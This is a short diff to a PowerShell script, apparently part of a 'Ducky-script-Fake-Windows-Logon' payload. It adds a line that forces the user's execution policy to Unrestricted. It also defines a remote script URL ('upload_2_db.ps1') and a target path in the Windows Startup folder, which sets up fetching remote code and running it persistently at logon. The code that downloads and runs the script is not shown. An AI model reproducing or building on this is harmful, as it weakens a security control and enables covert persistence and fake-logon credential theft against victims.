@@ -1,3 +1,4 @@
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
 $url = "https://raw.githubusercontent.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/main/upload_2_db.ps1"
 $scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\upload_2_db.ps1"
 
